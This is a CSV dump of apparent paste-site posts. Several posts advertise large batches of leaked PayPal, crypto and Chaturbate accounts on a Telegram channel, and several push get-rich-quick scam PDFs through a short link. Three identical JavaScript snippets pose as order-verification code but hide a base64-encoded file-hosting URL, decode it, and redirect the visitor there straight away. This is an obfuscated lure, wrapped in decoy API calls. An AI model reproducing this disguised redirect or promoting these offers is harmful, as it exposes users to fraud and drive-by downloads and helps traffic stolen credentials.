id,title,username,language,date,content
TS5G8RUd,Chaturbate with Tokens,zebmekey,JavaScript,Saturday 26th of April 2025 12:32:01 AM CDT,27651 Accounts Posted On https://t.me/leakedbyem1nem
ik9AFfGA,Make $1000 15-MINUTES (BEGINNER) 96,SueArce,JavaScript,Saturday 26th of April 2025 12:24:59 AM CDT," 
Pdf https://tinyurl.com/privguidee

OsqkHXmChS
"
Y5mtEzyB,Order.js,SpawnKz,JavaScript,Saturday 26th of April 2025 12:19:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57460/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
i1K1MBfk,Crypto Accounts,zebmekey,JavaScript,Saturday 26th of April 2025 12:16:27 AM CDT,22317 Accounts Posted On https://t.me/leakedbyem1nem
xR3R9RFS,EARN $900 INSTANTLY 2025⭐ NU,SueArce,JavaScript,Saturday 26th of April 2025 12:15:44 AM CDT," 
Pdf https://tinyurl.com/privguidee

hc4RzQsJcn
"
9Pa0FdMs,Make $1000 15-MINUTES  (BEGINNER) ME,SueArce,JavaScript,Saturday 26th of April 2025 12:06:30 AM CDT," 
Pdf https://tinyurl.com/privguidee

WjJNUwweos
"
bNej4MPc,Market.js,SpawnKz,JavaScript,Saturday 26th of April 2025 12:04:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37002/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FP9tw8th,PayPal with Balance,zebmekey,JavaScript,Saturday 26th of April 2025 12:01:05 AM CDT,47205 Accounts Posted On https://t.me/leakedbyem1nem
xuLFwjCh,Untitled,SpawnKz,JavaScript,Friday 25th of April 2025 11:48:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28665/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YajUrpK6,Leaked Accounts - Fresh Hits,zebmekey,JavaScript,Friday 25th of April 2025 11:45:42 PM CDT,92251 Accounts Posted On https://t.me/leakedbyem1nem
